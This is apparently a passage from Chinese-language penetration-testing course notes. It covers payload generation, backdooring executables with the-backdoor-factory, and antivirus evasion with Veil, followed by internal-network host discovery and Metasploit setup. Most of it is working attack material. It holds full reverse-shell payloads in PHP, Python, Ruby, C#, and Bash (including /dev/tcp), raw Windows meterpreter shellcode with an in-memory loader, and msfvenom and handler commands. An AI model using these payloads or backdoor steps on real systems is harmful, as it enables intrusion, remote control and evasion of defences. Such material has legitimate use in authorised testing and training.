<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> </span><br><span class="line"># include &lt;windows.h&gt;  </span><br><span class="line">int main(void)  </span><br><span class="line">&#123;  </span><br><span class="line">char *shellcode &#x3D; (char *)&quot;Micropoor_shellcode&quot;;  </span><br><span class="line">DWORD Micropoor_shellcode;  </span><br><span class="line">BOOL ret &#x3D; VirtualProtect(shellcode, strlen(shellcode),  </span><br><span class="line">PAGE_EXECUTE_READWRITE, &amp;Micropoor_shellcode);  </span><br><span class="line">if (!ret) &#123;  </span><br><span class="line">return EXIT_FAILURE;  </span><br><span class="line">&#125;  </span><br><span class="line">((void(*)(void))shellcode)();  </span><br><span class="line">return EXIT_SUCCESS;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>第二次优化</p>
<ul>
<li>载入PEID </li>
<li>合并<strong>data to text</strong>，<strong>rdata to text</strong> 在次生成</li>
</ul>
</li>
<li><p>第三次优化</p>
<ul>
<li>在00000E60起含有大部分000h，充填掉00，在次生成payload</li>
</ul>
</li>
</ul>
<h1 id="三、-工具讲解"><a href="#三、-工具讲解" class="headerlink" title="三、 工具讲解"></a>三、 工具讲解</h1><h2 id="9-工具介绍-the-backdoor-factory"><a href="#9-工具介绍-the-backdoor-factory" class="headerlink" title="9. 工具介绍 the-backdoor-factory"></a>9. 工具介绍 the-backdoor-factory</h2><p>项目地址：<a href="https://github.com/secretsquirrel/the-backdoor-factory">https://github.com/secretsquirrel/the-backdoor-factory</a></p>
<p>原理介绍</p>
<blockquote>
<p>可执行二进制文件中有大量的 00，这些 00 是不包含数据的，将这些数据替换成 payload，并且在 </p>
<p>程序执行的时候，jmp 到代码段，来触发 payload</p>
</blockquote>
<p><code>the-backdoor-factory</code>使用</p>
<ul>
<li>检测是否支持后门植入 <ul>
<li>./backdoor.py -f ~/demo/guobang.exe -s</li>
</ul>
</li>
<li>测试裂缝空间<code>size150</code><ul>
<li>./backdoor.py -f ~/demo/guobang.exe -c -l 150</li>
</ul>
</li>
<li>查看可用<code>Payload</code><ul>
<li>./backdoor.py -f ~/demo/guobang.exe -s show</li>
</ul>
</li>
<li>插入<code>Payload</code>并生成文件<ul>
<li>./backdoor.py -f ~/demo/guobang.exe -H 192.168.1.111 -P 8080 -s iat_reverse_tcp_stager_threaded</li>
</ul>
</li>
</ul>
<p>配置MSF:</p>
<ul>
<li>use exploit/multi/handler</li>
<li>set payload windows/meterpreter/reverse_tcp</li>
<li>set lhost 192.168.1.111</li>
<li>set lport 8080</li>
<li>exploit -j</li>
</ul>
<p>运行新生成的后门时，即会反弹<code>meterpreter shell</code></p>
<h2 id="10-msfvenom常用生成payload命令"><a href="#10-msfvenom常用生成payload命令" class="headerlink" title="10. msfvenom常用生成payload命令"></a>10. msfvenom常用生成payload命令</h2><p>便捷Payload生成工具:<a href="https://github.com/Screetsec/TheFatRat">https://github.com/Screetsec/TheFatRat</a></p>
<h2 id="14-基于第十课补充-Payload-1"><a href="#14-基于第十课补充-Payload-1" class="headerlink" title="14. 基于第十课补充 Payload 1"></a>14. 基于第十课补充 Payload 1</h2><ul>
<li>PHP</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="variable">$sock</span>=fsockopen(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,xx);exec(<span class="string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>python</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,struct,time</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=socket.socket(<span class="number">2</span>,socket.SOCK_STREAM)</span><br><span class="line">        s.connect((<span class="string">&#x27;x.x.x.x&#x27;</span>,xx))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        time.sleep(<span class="number">5</span>) l=struct.unpack(<span class="string">&#x27;&gt;I&#x27;</span>,s.recv(<span class="number">4</span>))[<span class="number">0</span>]</span><br><span class="line">d=s.recv(l)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(d)&lt;l:</span><br><span class="line">    d+=s.recv(l-<span class="built_in">len</span>(d))</span><br><span class="line">exec(d,&#123;<span class="string">&#x27;s&#x27;</span>:s&#125;)</span><br></pre></td></tr></table></figure>
<ul>
<li>C</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//删除特征</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d &#x27;&quot;&#x27; | tr -d &#x27;\n&#x27;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from ctypes <span class="keyword">import</span> *</span><br><span class="line">reverse_shell = <span class="string">&quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\x08\x08\x08\x08\x68\x02\x00\x00\x58\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span></span><br><span class="line">micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))</span><br><span class="line">shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shellcode()</span><br></pre></td></tr></table></figure>
<ul>
<li>Ruby- Payload</li>
</ul>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">c=TCPSocket.new(<span class="string">&quot;xx.xx.xx.xx&quot;</span>, x);<span class="variable">$stdin</span>.reopen(c);<span class="variable">$stdout</span>.reopen(c);<span class="variable">$stderr</span>.reopen(c);<span class="variable">$stdin</span> (IO.popen(l,<span class="string">&quot;rb&quot;</span>)&#123;<span class="params">|fd|</span> fd.each_line &#123;<span class="params">|o|</span> c.puts(o.strip) &#125;&#125;) <span class="keyword">rescue</span> <span class="literal">nil</span> &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">f=TCPSocket.open(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,xx).to_i;exec sprintf(<span class="string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)</span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;socket&#x27;</span>;</span><br><span class="line">c=TCPSocket.new(<span class="string">&quot;xx.xx.xx.xx&quot;</span>,<span class="string">&quot;xx&quot;</span>);<span class="keyword">while</span>(cmd=c.gets);IO.popen(cmd,<span class="string">&quot;r&quot;</span>)&#123;<span class="params">|io|</span>c.print io.read&#125;<span class="keyword">end</span></span><br></pre></td></tr></table></figure>
<h2 id="15-基于第十课补充payload2"><a href="#15-基于第十课补充payload2" class="headerlink" title="15. 基于第十课补充payload2"></a>15. 基于第十课补充payload2</h2><ul>
<li>c#</li>
</ul>
<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Net;</span><br><span class="line"><span class="keyword">using</span> System.Net.Sockets;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">using</span> System.Threading;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">RkfCHtll</span> &#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title">LiNGeDokqnEH</span> &#123;</span><br><span class="line">		<span class="function"><span class="keyword">static</span> <span class="built_in">byte</span>[] <span class="title">idCWVw</span>(<span class="params"><span class="built_in">string</span> VVUUJUQytjlL, <span class="built_in">int</span> eMcukOUqFuHbUv</span>)</span> &#123;</span><br><span class="line">			IPEndPoint nlttgWAMdEQgAo = <span class="keyword">new</span> IPEndPoint(IPAddress.Parse(VVUUJUQytjlL), eMcukOUqFuHbUv);</span><br><span class="line">				Socket fzTiwdk = <span class="keyword">new</span> Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line">				<span class="keyword">try</span> &#123;</span><br><span class="line">				fzTiwdk.Connect(nlttgWAMdEQgAo);</span><br><span class="line">			&#125;</span><br><span class="line">			catch &#123; <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">			&#125; <span class="built_in">byte</span>[] gJVVagJmu = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">4</span>];</span><br><span class="line">				fzTiwdk.Receive(gJVVagJmu, <span class="number">4</span>, <span class="number">0</span>);</span><br><span class="line">				<span class="built_in">int</span> GFxHorfhzft = BitConverter.ToInt32(gJVVagJmu, <span class="number">0</span>);</span><br><span class="line">				<span class="built_in">byte</span>[] mwxyRsYNn = <span class="keyword">new</span> <span class="built_in">byte</span>[GFxHorfhzft + <span class="number">5</span>];</span><br><span class="line">				<span class="built_in">int</span> yVcZAEmXaMszAc = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">while</span> (yVcZAEmXaMszAc &lt; GFxHorfhzft) &#123;</span><br><span class="line">					yVcZAEmXaMszAc += fzTiwdk.Receive(mwxyRsYNn, yVcZAEmXaMszAc + <span class="number">5</span>, (GFxHorfhzft - yVcZAEmXaMszAc) &lt; <span class="number">4096</span> ? (GFxHorfhzft - yVcZAEmXaMszAc) : <span class="number">4096</span>, <span class="number">0</span>);</span><br><span class="line">				&#125; <span class="built_in">byte</span>[] XEvFDc = BitConverter.GetBytes((<span class="built_in">int</span>)fzTiwdk.Handle);</span><br><span class="line">						Array.Copy(XEvFDc, <span class="number">0</span>, mwxyRsYNn, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">						mwxyRsYNn[<span class="number">0</span>] = <span class="number">0xBF</span>;</span><br><span class="line">						<span class="keyword">return</span> mwxyRsYNn;</span><br><span class="line">		&#125; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hcvPkmyIZ</span>(<span class="params"><span class="built_in">byte</span>[] fPnfqu</span>)</span> &#123;</span><br><span class="line">						<span class="keyword">if</span> (fPnfqu != <span class="literal">null</span>) &#123;</span><br><span class="line">							UInt32 hcoGPUltNcjK = VirtualAlloc(<span class="number">0</span>, (UInt32)fPnfqu.Length, <span class="number">0x1000</span>, <span class="number">0x40</span>);</span><br><span class="line">								Marshal.Copy(fPnfqu, <span class="number">0</span>, (IntPtr)(hcoGPUltNcjK), fPnfqu.Length);</span><br><span class="line">								IntPtr xOxEPnqW = IntPtr.Zero;</span><br><span class="line">								UInt32 ooiiZLMzO = <span class="number">0</span>;</span><br><span class="line">								IntPtr wxPyud = IntPtr.Zero;</span><br><span class="line">								xOxEPnqW = CreateThread(<span class="number">0</span>, <span class="number">0</span>, hcoGPUltNcjK, wxPyud, <span class="number">0</span>, <span class="keyword">ref</span> ooiiZLMzO);</span><br><span class="line">								WaitForSingleObject(xOxEPnqW, <span class="number">0xFFFFFFFF</span>);</span><br><span class="line">						&#125;</span><br><span class="line">					&#125; <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">						<span class="built_in">byte</span>[] dCwAid = <span class="literal">null</span>;</span><br><span class="line">							dCwAid = idCWVw(<span class="string">&quot;xx.xx.xx.xx&quot;</span>, xx);</span><br><span class="line">							hcvPkmyIZ(dCwAid);</span><br><span class="line">					&#125;[DllImport(<span class="string">&quot;kernel32&quot;</span>)] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">VirtualAlloc</span>(<span class="params">UInt32 qWBbOS, UInt32 HoKzSHMU, UInt32 mqFcYDHjaQJye, UInt32 EbMqzSROjgb</span>);</span></span><br><span class="line"><span class="function">							[<span class="title">DllImport</span>(<span class="params"><span class="string">&quot;kernel32&quot;</span></span>)]<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 tqUXybrozZ, UInt32 FMmVpwin, UInt32 HhvKSTWeKKsuBOG, IntPtr wXrghrXxDXaJDj, UInt32 zHqryJZjmSJ, [DllImport(<span class="string">&quot;kernel32&quot;</span></span>)] <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr CApwDwK, UInt32 uzGJUddCYTd</span>);</span></span><br><span class="line"><span class="function">	&#125;</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Bash</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xx 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">exec</span> 5&lt;&gt;/dev/tcp/xx.xx.xx.xx/xx </span><br><span class="line">cat &lt;&amp;5 | <span class="keyword">while</span> <span class="built_in">read</span> line; <span class="keyword">do</span> <span class="variable">$line</span> 2&gt;&amp;5 &gt;&amp;5; <span class="keyword">done</span></span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=xx.xx..xx.xx LPORT=xx &gt; -f raw &gt; payload.sh</span><br></pre></td></tr></table></figure>
<ul>
<li>开源项目<ul>
<li> <a href="https://github.com/g0tmi1k/msfpc">https://github.com/g0tmi1k/msfpc</a></li>
</ul>
</li>
</ul>
<h2 id="11-工具介绍-Veil-Evasion"><a href="#11-工具介绍-Veil-Evasion" class="headerlink" title="11. 工具介绍 Veil-Evasion"></a>11. 工具介绍 Veil-Evasion</h2><p>新版本：<a href="https://github.com/Veil-Framework/Veil">https://github.com/Veil-Framework/Veil</a></p>
<p>可支持生成payloads:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">auxiliary&#x2F;coldwar_wrapper</span><br><span class="line">auxiliary&#x2F;macro_converter</span><br><span class="line">auxiliary&#x2F;pyinstaller_wrapper</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_http_service</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">c&#x2F;meterpreter&#x2F;rev_tcp_service</span><br><span class="line">c&#x2F;shellcode_inject&#x2F;flatc</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">cs&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">cs&#x2F;shellcode_inject&#x2F;base64_substitution</span><br><span class="line">cs&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">go&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">go&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">native&#x2F;backdoor_factory</span><br><span class="line">native&#x2F;hyperion</span><br><span class="line">native&#x2F;pe_scrambler</span><br><span class="line">perl&#x2F;shellcode_inject&#x2F;flat</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">powershell&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;download_virtual</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;download_virtual_https</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;psexec_virtual</span><br><span class="line">powershell&#x2F;shellcode_inject&#x2F;virtual</span><br><span class="line">python&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_http_contained</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_https_contained</span><br><span class="line">python&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;aes_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;aes_encrypt_HTTPKEY_Request</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;arc_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;base64_substitution</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;des_encrypt</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;download_inject</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;flat</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;letter_substitution</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;pidinject</span><br><span class="line">python&#x2F;shellcode_inject&#x2F;stallion</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_http</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_http_contained</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_https</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_https_contained</span><br><span class="line">ruby&#x2F;meterpreter&#x2F;rev_tcp</span><br><span class="line">ruby&#x2F;shellcode_inject&#x2F;base64</span><br><span class="line">ruby&#x2F;shellcode_inject&#x2F;flat</span><br></pre></td></tr></table></figure>


<h1 id="三、-内网渗透"><a href="#三、-内网渗透" class="headerlink" title="三、 内网渗透"></a>三、 内网渗透</h1><h2 id="12-基于-UDP-发现内网存活主机"><a href="#12-基于-UDP-发现内网存活主机" class="headerlink" title="12. 基于 UDP 发现内网存活主机"></a>12. 基于 UDP 发现内网存活主机</h2><ul>
<li>nmap (慢)</li>
</ul>
<blockquote>
<p> nmap -sU -T5 -sV –max-retries 1 192.168.1.100 -p 500</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/discovery/udp_probe</p>
<p>use auxiliary/scanner/discovery/udp_sweep </p>
</blockquote>
<ul>
<li>unicornscan扫描</li>
</ul>
<blockquote>
<p>unicornscan -mU 192.168.1.100 </p>
</blockquote>
<ul>
<li>ScanLine扫描</li>
</ul>
<blockquote>
<p>scanline -bht 80,100-200,443 10.0.0.1-200</p>
</blockquote>
<h2 id="13-基于-ARP-发现内网存活主机"><a href="#13-基于-ARP-发现内网存活主机" class="headerlink" title="13. 基于 ARP 发现内网存活主机"></a>13. 基于 ARP 发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sn -PR 192.168.1.1/24</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/discovery/arp_sweep</p>
</blockquote>
<ul>
<li>netdiscover (kali)</li>
</ul>
<blockquote>
<p>netdiscover -r 192.168.1.0/24 -i wlan0</p>
</blockquote>
<ul>
<li>arp-scan（linux）</li>
</ul>
<blockquote>
<p>arp-scan –interface=wlan0 –localnet</p>
</blockquote>
<ul>
<li>Powershell</li>
</ul>
<blockquote>
<p>&gt;powershell.exe -exec bypass -Command “Import-Module .\Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.1.0/24”</p>
</blockquote>
<ul>
<li>arp scannet</li>
<li>arp-scan（windows）速度快</li>
</ul>
<blockquote>
<p>arp-scan.exe -t 192.168.1.1/24</p>
</blockquote>
<ul>
<li>arp-ping.exe</li>
</ul>
<blockquote>
<p>arp-ping.exe 192.168.1.100</p>
</blockquote>
<h2 id="19-基于netbios发现内网存活主机"><a href="#19-基于netbios发现内网存活主机" class="headerlink" title="19. 基于netbios发现内网存活主机"></a>19. 基于netbios发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sU –script nbstat.nse -p137 192.168.1.0/24 -T4</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/netbios/nbname</p>
</blockquote>
<ul>
<li>nbtscan扫描</li>
</ul>
<blockquote>
<p>nbtscan-1.0.35.exe -m 192.168.1.0/24 </p>
<p>nbtstat -n （推荐）</p>
</blockquote>
<ul>
<li>Linux：（推荐）</li>
</ul>
<blockquote>
<p>nbtscan -r 192.168.1.0/24</p>
<p>nbtscan -v -s: 192.168.1.0/24</p>
</blockquote>
<ul>
<li>NetBScanner</li>
</ul>
<h2 id="20-基于snmp发现内网存活主机"><a href="#20-基于snmp发现内网存活主机" class="headerlink" title="20. 基于snmp发现内网存活主机"></a>20. 基于snmp发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap -sU –script snmp-brute 192.168.1.0/24 -T4</p>
</blockquote>
<ul>
<li>msf扫描</li>
</ul>
<blockquote>
<p>use auxiliary/scanner/snmp/snmp_enum</p>
</blockquote>
<ul>
<li>NetCrunch</li>
</ul>
<blockquote>
<p>项目地址：<a href="https://www.adremsoft.com/demo/">https://www.adremsoft.com/demo/</a> </p>
</blockquote>
<ul>
<li>snmp for pl扫描</li>
</ul>
<blockquote>
<p>项目地址： <a href="https://github.com/dheiland-r7/snmp">https://github.com/dheiland-r7/snmp</a> </p>
</blockquote>
<ul>
<li>snmpbulkwalk</li>
<li>snmp-check</li>
<li>snmptest</li>
</ul>
<h2 id="21-基于ICMP发现内网存活主机"><a href="#21-基于ICMP发现内网存活主机" class="headerlink" title="21. 基于ICMP发现内网存活主机"></a>21. 基于ICMP发现内网存活主机</h2><ul>
<li>nmap扫描</li>
</ul>
<blockquote>
<p>nmap ‐sP ‐PI 192.168.1.0/24 ‐T4</p>
<p>nmap ‐sn ‐PE ‐T4 192.168.1.0/24</p>
</blockquote>
<ul>
<li>CMD下扫描</li>
</ul>
<blockquote>
<p>for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.1.%P | findstr “TTL =” </p>
</blockquote>
<ul>
<li>powershell扫描</li>
</ul>
<blockquote>
<p>powershell.exe ‐exec bypass ‐Command “Import‐Module ./Invoke‐TSPingSweep.ps1 ; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ ResolveHost ‐ScanPort ‐Port 445,135”</p>
</blockquote>
<ul>
<li>tcping </li>
</ul>
<blockquote>
<p>tcping.exe ‐n 1 192.168.1.0 80 </p>
</blockquote>
<h2 id="22-基于SMB发现内网存活主机"><a href="#22-基于SMB发现内网存活主机" class="headerlink" title="22. 基于SMB发现内网存活主机"></a>22. 基于SMB发现内网存活主机</h2><ul>
<li>MSF</li>
</ul>
<blockquote>
<p>scanner/smb/smb_version</p>
</blockquote>
<ul>
<li>cme</li>
</ul>
<blockquote>
<p>cme smb 192.168.1.0/24</p>
</blockquote>
<ul>
<li>nmap</li>
</ul>
<blockquote>
<p>nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.1.119</p>
</blockquote>
<ul>
<li>CMD</li>
</ul>
<blockquote>
<p>for /l %a in (1,1,254) do start /min /low telnet 192.168.1.%a 445</p>
</blockquote>
<ul>
<li>powershell</li>
</ul>
<blockquote>
<p>单IP：</p>
<p>445 | %{ echo ((new‐object Net.Sockets.TcpClient).Connect(“192.168.1.119”,$<em>)) “$</em> is open”} 2&gt;$null </p>
<p>多IP：</p>
<p>1..5 | % { $a = $<em>; 445 | % {echo ((new‐object Net.Sockets.TcpClient).Connect(“192.168.1.$a”,$</em>)) “Port $_ is open”} 2&gt;$null}</p>
<p>多port，多IP：</p>
<p>118..119 | % { $a = $<em>; write‐host “‐‐‐‐‐‐”; write‐host “192.168.1.$a”; 80,445 | % {echo ((new‐object Net.Sockets.TcpClient).Conn ect(“192.168.1.$a”,$</em>)) “Port $_ is open”} 2&gt;$null}</p>
</blockquote>
<h2 id="29-发现目标WEB程序敏感目录第一季"><a href="#29-发现目标WEB程序敏感目录第一季" class="headerlink" title="29. 发现目标WEB程序敏感目录第一季"></a>29. 发现目标WEB程序敏感目录第一季</h2><ul>
<li>DIRB</li>
</ul>
<blockquote>
<p>dirb <a href="http://192.168.1.102/">http://192.168.1.102</a> ./ASPX.txt</p>
<p>dirb <a href="http://192.168.1.102/">http://192.168.1.102</a> ./ASPX.txt,./DIR.txt ‐a “Mozilla/5.0 (compatible; Googlebot/2.1; +<a href="http://www.google.com/bot.html)&quot;">http://www.google.com/bot.html)&quot;</a> -c “ASP.NET_SessionId=jennqviqmc2vws55o4ggwu45” -z 100</p>
<p>-a 自定义UA</p>
<p>-c 自定义Cookie</p>
<p>-z 自定义延时</p>
</blockquote>
<h2 id="50-基于SqlDataSourceEnumerator发现内网存活主机"><a href="#50-基于SqlDataSourceEnumerator发现内网存活主机" class="headerlink" title="50. 基于SqlDataSourceEnumerator发现内网存活主机"></a>50. 基于SqlDataSourceEnumerator发现内网存活主机</h2><p> SQL Server 允许应用程序在当前网络中查找 SQL Server 实例。 SqlDataSourceEnumerator 类向应用程序开发人员公开此信息，提供包含所有可见服务器的信息的 DataTable。 此返回的表包含网络上可用的服务器实例的列表，该列表与用户尝试创建新连接时提供的列表匹配，并展开包含连接属性上所有可用服务器的下拉列表。对话框。 显示的结果并非总是完整的</p>
 <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PowerShell <span class="literal">-Command</span> <span class="string">&quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot;</span></span><br></pre></td></tr></table></figure>
<h1 id="四、-MSF"><a href="#四、-MSF" class="headerlink" title="四、 MSF"></a>四、 MSF</h1><h2 id="32-配置vps上的msf"><a href="#32-配置vps上的msf" class="headerlink" title="32. 配置vps上的msf"></a>32. 配置vps上的msf</h2><ul>
<li>配置源</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">deb http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie main</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie main</span><br><span class="line">deb http:&#x2F;&#x2F;security.debian.org&#x2F; jessie&#x2F;updates main</span><br><span class="line">deb-src http:&#x2F;&#x2F;security.debian.org&#x2F; jessie&#x2F;updates main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie-updates main</span><br><span class="line">deb-src http:&#x2F;&#x2F;http.us.debian.org&#x2F;debian&#x2F; jessie-updates main</span><br><span class="line"></span><br><span class="line">deb http:&#x2F;&#x2F;http.kali.org&#x2F;kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>
<ul>
<li>更新源</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get update&amp;&amp;apt-get upgrade</span><br></pre></td></tr></table></figure>
<ul>
<li>安装MSF</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install metasploit-framework</span><br></pre></td></tr></table></figure>
<p>以此种方式安装，也无需在配置psql</p>
